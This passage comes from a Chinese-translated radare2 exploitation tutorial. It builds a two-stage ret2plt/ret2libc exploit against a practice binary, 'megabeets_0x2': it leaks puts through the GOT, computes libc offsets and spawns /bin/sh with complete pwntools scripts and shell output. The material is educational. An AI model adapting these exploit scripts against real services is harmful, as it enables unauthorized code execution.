<h2 id="泄漏puts的地址"><a href="#泄漏puts的地址" class="headerlink" title="泄漏puts的地址"></a>泄漏<code>puts</code>的地址</h2><p>我们需要用到<code>ret2plt</code>来泄漏<code>puts</code>的真实地址。<code>PLT</code>（<em>Procedure Linkage Table</em>）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在<code>.text</code>段看到<code>CALL</code>指令，并不是直接跳到函数。实际上，它跳转到了<code>PLT</code>中的一小段代码，像是<code>func_name@plt</code>这样。这一小段代码跳转到<code>GOT</code>（<em>Global Offset Table</em>）中的列出的该函数的地址。<code>GOT</code>表入口点会指回<code>PLT</code>，同时<code>PLT</code>会调用一个动态链接器来确定该函数的真实地址。下一次调用<code>func_name@plt</code>时，这段代码会直接跳转到<code>GOT</code>表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">这一系列关于链接器的文章</a></p>
<p>为了达到这个目的，我们需要找到<code>puts</code>在<code>PLT</code>以及<code>GOT</code>中的地址，然后调用<code>puts@plt</code>并且把<code>puts@got</code>作为参数。我们将把这些调用连在一起，在<code>scanf</code>时传给程序。然后我们会返回到我们利用的第二个阶段。<code>puts</code>将会把它真实的地址输出出来。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 1       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| puts@plt            |</span><br><span class="line">| entry_point         |</span><br><span class="line">| puts@got            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<p>编写脚本我们需要使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>框架，而且它是我最喜欢的python漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。</p>
<p>使用<code>pip</code>下载<em>pwntools</em>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> pip install --upgrade pip</span><br><span class="line"><span class="meta">$</span> pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
<p>你可以在<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">官方文档</a>上了解更多关于<em>pwntools</em>。</p>
<p>这是我们第一阶段的python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt =</span><br><span class="line">puts_got =</span><br><span class="line">entry_point =</span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span> <span class="comment"># padding</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>我们需要填充<code>puts@plt</code>和<code>puts@got</code>的地址，以及程序的入口点。让我们回到<code>radare2</code>并执行以下命令。字符<code>#</code>用于注释，字符<code>~</code>是<code>radare2</code>的shell中的内置<code>grep</code>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@plt:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v sym.imp.puts</span><br><span class="line">0x08048390</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of puts@got:</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ?v reloc.puts_20</span><br><span class="line">0x0804a014</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> # the address of program’s entry point (entry0):</span><br><span class="line"><span class="meta">[0xf7763b30]&gt;</span> ieq</span><br><span class="line">0x080483d0</span><br></pre></td></tr></table></figure>
<p><code>sym.imp.puts</code>和<code>reloc.puts_20</code>是<code>radare2</code>自动检测到的标志。命令<code>ie</code>表示<code>Information Entrypoint</code>。</p>
<p>现在我们填入我们找到的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>我们执行一下脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23578</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23578)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23592</span><br><span class="line">[*] puts is at: 0xf7563710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23592)</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 23606</span><br><span class="line">[*] puts is at: 0xf75e3710</span><br><span class="line">[*] Stopped process ‘./megabeets_0x2’ (pid 23606)</span><br></pre></td></tr></table></figure>
<p>我执行了脚本三次，<code>puts</code>的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到<code>puts</code>在<em>libc</em>中的偏移，然后计算出<em>libc</em>的基址。在我们找到基址后，我们可以用偏移计算出<code>system</code>、<code>exit</code>以及字符串<code>/bin/sh</code>的地址。</p>
<p>现在我们的脚本应该是这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = </span><br><span class="line">offset_system = </span><br><span class="line">offset_str_bin_sh = </span><br><span class="line">offset_exit = </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    </span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line"> </span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"binsh: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="计算真实地址"><a href="#计算真实地址" class="headerlink" title="计算真实地址"></a>计算真实地址</h2><p><em>请注意在文章的这部分，我的结果可能与你的不同。因为我们的libc版本不同，所以会产生不同的偏移。</em></p>
<p>首先我们需要找到<code>puts</code>在<em>libc</em>上的偏移。我们再一次打开<code>radare2</code>，继续执行到入口点。做以上步骤的原因是我们在<em>libc</em>载入之前开始调试程序，直到入口点时，运行库才全部加载完。</p>
<p>我们使用<code>dmi</code>命令，将<em>libc</em>和函数作为参数。我加上了<code>~</code>来显示相关的信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -d megabeets_0x2</span><br><span class="line">Process with PID 24124 started…</span><br><span class="line">= attach 24124 24124</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32</span><br><span class="line">— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf771ab30]&gt;</span> dcu entry0</span><br><span class="line">Continue until 0x080483d0 using 1 bpsize</span><br><span class="line">hit breakpoint at: 80483d0</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc puts~ puts$</span><br><span class="line">vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc system~ system$</span><br><span class="line">vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmi libc exit~ exit$</span><br><span class="line">vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit</span><br></pre></td></tr></table></figure>
<p><em>请注意，在这篇文章发表前，<code>dmi</code>的输出格式就已经改变了。你的结果很有可能与我的有所不同。</em></p>
<p>所有这些<code>paddr=0x000xxxxx</code>是函数在<em>libc</em>上的偏移。现在我们需要在程序中找到<code>/bin/sh</code>的位置。我们将要使用<code>radare2</code>的一些搜索功能。<code>radare2</code>默认在<code>dbg.map</code>，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> e search.in = dbg.maps</span><br></pre></td></tr></table></figure>
<p>你可以执行<code>e search.in=?</code>查看更多选项。执行<code>Ve</code>配置可视化模式</p>
<p>在<code>radare2</code>中通过<code>/</code>命令查找。让我们看看<code>radare2</code>给我们提供的查找参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)</span><br><span class="line">| / foo\x00           search for string ‘foo\0’</span><br><span class="line">| /j foo\x00          search for string ‘foo\0’ (json output)</span><br><span class="line">| /! ff               search for first occurrence not matching</span><br><span class="line">| /+ /bin/sh          construct the string with chunks</span><br><span class="line">| /!x 00              inverse hexa search (find first byte != 0x00)</span><br><span class="line">| //                  repeat last search</span><br><span class="line">| /h[t] [hash] [len]  find block matching this hash. See /#?</span><br><span class="line">| /a jmp eax          assemble opcode and search its bytes</span><br><span class="line">| /A jmp              find analyzed instructions of this type (/A? for help)</span><br><span class="line">| /b                  search backwards</span><br><span class="line">| /B                  search recognized RBin headers</span><br><span class="line">| /c jmp [esp]        search for asm code</span><br><span class="line">| /C[ar]              search for crypto materials</span><br><span class="line">| /d 101112           search for a deltified sequence of bytes</span><br><span class="line">| /e /E.F/i           match regular expression</span><br><span class="line">| /E esil-expr        offset matching given esil expressions %%= here</span><br><span class="line">| /f file [off] [sz]  search contents of file with offset and size</span><br><span class="line">| /i foo              search for string ‘foo’ ignoring case</span><br><span class="line">| /m magicfile        search for matching magic file (use blocksize)</span><br><span class="line">| /o                  show offset of previous instruction</span><br><span class="line">| /p patternsize      search for pattern of given size</span><br><span class="line">| /P patternsize      search similar blocks</span><br><span class="line">| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)</span><br><span class="line">| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated</span><br><span class="line">| /v[1248] value      look for an cfg.bigendian 32bit value</span><br><span class="line">| /V[1248] min max    look for an cfg.bigendian 32bit value in range</span><br><span class="line">| /w foo              search for wide string ‘f\0o\0o\0’</span><br><span class="line">| /wi foo             search for wide string ignoring case ‘f\0o\0o\0’</span><br><span class="line">| /x ff..33           search for hex string ignoring some nibbles</span><br><span class="line">| /x ff0033           search for hex string</span><br><span class="line">| /x ff43 ffd0        search for hexpair with mask</span><br><span class="line">| /z min max          search for strings of given size</span><br></pre></td></tr></table></figure>
<p>提供给我们了许多不同的方式。同时还发心<code>/R</code>能够帮助我们查找ROP。可惜这篇文章里我们没有打算使用ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。</p>
<p>我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前<em>libc</em>载入的地址，然后计算出<code>/bin/sh</code>的偏移。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> / /bin/sh</span><br><span class="line">Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68</span><br><span class="line">Searching 7 bytes in [0x8048000-0x8049000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0x8049000-0x804a000]</span><br><span class="line">hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]</span><br><span class="line">hits: 0</span><br><span class="line">Searching 7 bytes in [0xffd2f000-0xffd50000]</span><br><span class="line">hits: 0</span><br><span class="line">0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.</span><br></pre></td></tr></table></figure>
<p><code>r2</code>在内存中找到了<code>/bin/sh</code>。现在我们计算它相对<em>libc</em>基址的偏移：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x080483d0]&gt;</span> dmm~libc</span><br><span class="line">0xf7599000 /usr/lib32/libc-2.25.so</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span> ?X 0xf7700768-0xf7599000</span><br><span class="line">167768</span><br></pre></td></tr></table></figure>
<p>我们发现<code>/bin/sh</code>相对<em>libc</em>基址的偏移为<code>0x167768</code>。我们把它填进脚本中，并且可以开始我们的最后一个步骤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span>  </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>漏洞利用的第二阶段很直接。我们继续使用140个字符，然后调用<code>system</code>并将<code>/bin/sh</code>作为参数，最后<code>exit</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+</span><br><span class="line">|       Stage 2       |</span><br><span class="line">+---------------------+</span><br><span class="line">| padding (140 bytes) |</span><br><span class="line">| system@libc         |</span><br><span class="line">| exit@libc           |</span><br><span class="line">| /bin/sh address     |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
<p>还记得上一次我们返回到了入口点吗？这意味着<code>scanf</code>又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。</p>
<p>这是我们最后的脚本。像我之前所说的，你只需要替换符合你的<em>libc</em>的偏移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x80483d0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Offsets</span></span><br><span class="line">offset_puts = <span class="number">0x00062710</span> </span><br><span class="line">offset_system = <span class="number">0x0003c060</span> </span><br><span class="line">offset_exit = <span class="number">0x0002f1b0</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x167768</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate libc base</span></span><br><span class="line">    libc_base = leak - offset_puts</span><br><span class="line">    log.info(<span class="string">"libc base: 0x%x"</span> % libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate offsets</span></span><br><span class="line">    system_addr = libc_base + offset_system</span><br><span class="line">    exit_addr = libc_base  + offset_exit</span><br><span class="line">    binsh_addr = libc_base + offset_str_bin_sh</span><br><span class="line"> </span><br><span class="line">    log.info(<span class="string">"system is at: 0x%x"</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">"/bin/sh is at: 0x%x"</span> % binsh_addr)</span><br><span class="line">    log.info(<span class="string">"exit is at: 0x%x"</span> % exit_addr)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Build 2nd payload</span></span><br><span class="line">    payload2  =  <span class="string">"A"</span>*<span class="number">140</span></span><br><span class="line">    ropchain2 =  p32(system_addr)</span><br><span class="line">    ropchain2 += p32(exit_addr)</span><br><span class="line">    <span class="comment"># Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)</span></span><br><span class="line">    <span class="comment">#           Then you'll execute system("sh")</span></span><br><span class="line">    ropchain2 += p32(binsh_addr) </span><br><span class="line"> </span><br><span class="line">    payload2 = payload2 + ropchain2</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">    log.success(<span class="string">"Here comes the shell!"</span>)</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.interactive()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>跑这个脚本我们就能成功拿到一个shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> python exploit.py</span><br><span class="line">[+] Starting local process ‘./megabeets_0x2’: pid 24410</span><br><span class="line">[*] puts is at: 0xf75db710</span><br><span class="line">[*] libc base: 0xf75ce000</span><br><span class="line">[*] system is at: 0xf760a060</span><br><span class="line">[*] /bin/sh is at: 0xf7735768</span><br><span class="line">[*] exit is at: 0xf75fd1b0</span><br><span class="line">[+] Here comes the shell!</span><br><span class="line">[*] Switching to interactive mode:</span><br><span class="line">  </span><br><span class="line"><span class="meta">$</span> whoami</span><br><span class="line">beet</span><br><span class="line"><span class="meta">$</span> echo EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅的第二部分就到此结束了。我们简单地学习了一些<code>radare2</code>中漏洞利用的功能。在下一部分中，我们会学习<code>radare2</code>再脚本编写和恶意软件分析中的功能。</p>
<h1 id="漏洞利用命令对应表"><a href="#漏洞利用命令对应表" class="headerlink" title="漏洞利用命令对应表"></a>漏洞利用命令对应表</h1><p>这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。</p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul>
<li><code>$ rabin2 -I ./program</code>——二进制信息（和<code>radare2</code>的shell中<code>i</code>命令相同）</li>
